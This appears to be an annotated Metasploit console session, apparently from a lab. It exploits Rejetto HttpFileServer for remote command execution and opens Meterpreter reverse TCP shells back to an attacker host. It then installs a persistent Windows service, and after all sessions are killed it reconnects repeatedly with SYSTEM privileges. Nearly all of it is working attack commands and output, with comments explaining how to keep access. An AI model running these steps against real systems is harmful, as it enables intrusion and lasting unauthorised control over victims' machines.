msf6 exploit(windows/http/rejetto_hfs_exec) >  `search platform:windows persistence`

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   0   exploit/windows/local/persistence                     2011-10-19       excellent  No     Windows Persistent Registry Startup Payload Installer
   1   exploit/windows/local/persistence_image_exec_options  2008-06-28       excellent  No     Windows Silent Process Exit Persistence
   2   exploit/windows/local/persistence_service             2018-10-20       excellent  No     Windows Persistent Service Installer
   3   exploit/windows/local/ps_wmi_exec                     2012-08-19       excellent  No     Authenticated WMI Exec via Powershell
   4   exploit/windows/local/registry_persistence            2015-07-01       excellent  Yes    Windows Registry Only Persistence
   5   exploit/windows/local/s4u_persistence                 2013-01-02       excellent  No     Windows Manage User Level Persistent Payload Installer
   6   exploit/windows/local/vss_persistence                 2011-10-21       excellent  No     Persistent Payload in Windows Volume Shadow Copy
   7   exploit/windows/local/wmi_persistence                 2017-06-06       normal     No     WMI Event Subscription Persistence
   8   post/windows/gather/enum_ad_managedby_groups                           normal     No     Windows Gather Active Directory Managed Groups
   9   post/windows/manage/persistence_exe                                    normal     No     Windows Manage Persistent EXE Payload Installer
   10  post/windows/manage/sshkey_persistence                                 good       No     SSH Key Persistence


Interact with a module by name or index. For example info 10, use 10 or use post/windows/manage/sshkey_persistence

msf6 exploit(windows/http/rejetto_hfs_exec) > 

*************************************************************************************************************************************************************

# Consider we have initial access by exploiting one vulnerability
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > `use 0`
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > `set RHOSTS 10.5.29.147`
RHOSTS => 10.5.29.147
msf6 exploit(windows/http/rejetto_hfs_exec) > `run`

[*] Started reverse TCP handler on 10.10.12.2:4444 
[*] Using URL: http://0.0.0.0:8080/o5ZClbLjux
[*] Local IP: http://10.10.12.2:8080/o5ZClbLjux
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /o5ZClbLjux
[*] Sending stage (175174 bytes) to 10.5.29.147
[*] Meterpreter session 1 opened (10.10.12.2:4444 -> 10.5.29.147:49240) at 2024-01-05 11:02:51 +0530
[!] Tried to delete %TEMP%\UapfCxhfal.vbs, unknown result
[*] Server stopped.

meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/http/rejetto_hfs_exec) > `sessions`

Active sessions
===============

  Id  Name  Type                     Information                                      Connection
  --  ----  ----                     -----------                                      ----------
  1         meterpreter x86/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.12.2:4444 -> 10.5.29.147:49240 (10.5.29.147)


# We can then use `Persistent Service Installer` by specifiing LPORT and LHOST, this will help us in regaining access to target evern after ending all sessions.

msf6 exploit(windows/http/rejetto_hfs_exec) > `search platform:windows persistence`

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   0   exploit/windows/local/persistence                     2011-10-19       excellent  No     Windows Persistent Registry Startup Payload Installer
   1   exploit/windows/local/persistence_image_exec_options  2008-06-28       excellent  No     Windows Silent Process Exit Persistence
   2   exploit/windows/local/persistence_service             2018-10-20       excellent  No     Windows Persistent Service Installer
   3   exploit/windows/local/ps_wmi_exec                     2012-08-19       excellent  No     Authenticated WMI Exec via Powershell
   4   exploit/windows/local/registry_persistence            2015-07-01       excellent  Yes    Windows Registry Only Persistence
   5   exploit/windows/local/s4u_persistence                 2013-01-02       excellent  No     Windows Manage User Level Persistent Payload Installer
   6   exploit/windows/local/vss_persistence                 2011-10-21       excellent  No     Persistent Payload in Windows Volume Shadow Copy
   7   exploit/windows/local/wmi_persistence                 2017-06-06       normal     No     WMI Event Subscription Persistence
   8   post/windows/gather/enum_ad_managedby_groups                           normal     No     Windows Gather Active Directory Managed Groups
   9   post/windows/manage/persistence_exe                                    normal     No     Windows Manage Persistent EXE Payload Installer
   10  post/windows/manage/sshkey_persistence                                 good       No     SSH Key Persistence


Interact with a module by name or index. For example info 10, use 10 or use post/windows/manage/sshkey_persistence

msf6 exploit(windows/http/rejetto_hfs_exec) > `use exploit/windows/local/persistence_service`
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence_service) > `options`

Module options (exploit/windows/local/persistence_service):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   REMOTE_EXE_NAME                       no        The remote victim name. Random string as default.
   REMOTE_EXE_PATH                       no        The remote victim exe path to run. Use temp directory as default.
   RETRY_TIME           5                no        The retry time that shell connect failed. 5 seconds as default.
   SERVICE_DESCRIPTION                   no        The description of service. Random string as default.
   SERVICE_NAME                          no        The name of service. Random string as default.
   SESSION                               yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.12.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/local/persistence_service) > `set payload windows/meterpreter/reverse_tcp`
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence_service) > `run`

[-] Exploit failed: One or more options failed to validate: SESSION.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/persistence_service) > `set SESSION 1`
SESSION => 1
msf6 exploit(windows/local/persistence_service) > `run`

[*] Started reverse TCP handler on 10.10.12.2:4444 
[*] Running module against WIN-OMCNBKR66MN
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\1\EwmHQs.exe
[*] Creating service bJKpCyM
[*] Sending stage (175174 bytes) to 10.5.29.147
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/WIN-OMCNBKR66MN_20240105.0516/WIN-OMCNBKR66MN_20240105.0516.rc
[*] Meterpreter session 2 opened (10.10.12.2:4444 -> 10.5.29.147:49250) at 2024-01-05 11:05:16 +0530

meterpreter > exit
[*] Shutting down Meterpreter...

[*] 10.5.29.147 - Meterpreter session 2 closed.  Reason: User exit

# Now kill all the sessions to get rid of access to the target machine

msf6 exploit(windows/local/persistence_service) > `sessions -K`
[*] Killing all sessions...
[*] 10.5.29.147 - Meterpreter session 1 closed.
msf6 exploit(windows/local/persistence_service) > `sessions`

Active sessions
===============

No active sessions.

# Now we can get back access to target machine as manny times we want, we just nned to specify same LHOST and LPORT

msf6 exploit(windows/local/persistence_service) > `use multi/handler`
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > `set payload windows/meterpreter/reverse_tcp`
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > `run`

[-] Exploit failed: One or more options failed to validate: LHOST.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > `options`

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > `set LHOST 10.10.12.2`
LHOST => 10.10.12.2
msf6 exploit(multi/handler) > `run`

[*] Started reverse TCP handler on 10.10.12.2:4444 
[*] Sending stage (175174 bytes) to 10.5.29.147
[*] Meterpreter session 3 opened (10.10.12.2:4444 -> 10.5.29.147:49264) at 2024-01-05 11:06:41 +0530

meterpreter > `whoami`
[-] Unknown command: whoami.
meterpreter > `getuid`
Server username: NT AUTHORITY\SYSTEM
meterpreter > `exit`
[*] Shutting down Meterpreter...

[*] 10.5.29.147 - Meterpreter session 3 closed.  Reason: User exit
msf6 exploit(multi/handler) > `run`

[*] Started reverse TCP handler on 10.10.12.2:4444 
[*] Sending stage (175174 bytes) to 10.5.29.147
[*] Meterpreter session 4 opened (10.10.12.2:4444 -> 10.5.29.147:49266) at 2024-01-05 11:06:57 +0530

meterpreter > `exit`
[*] Shutting down Meterpreter...

[*] 10.5.29.147 - Meterpreter session 4 closed.  Reason: User exit
msf6 exploit(multi/handler) > `run`

[*] Started reverse TCP handler on 10.10.12.2:4444 
[*] Sending stage (175174 bytes) to 10.5.29.147
[*] Meterpreter session 5 opened (10.10.12.2:4444 -> 10.5.29.147:49267) at 2024-01-05 11:07:03 +0530

meterpreter > `exit`
[*] Shutting down Meterpreter...

[*] 10.5.29.147 - Meterpreter session 5 closed.  Reason: User exit
msf6 exploit(multi/handler) > 

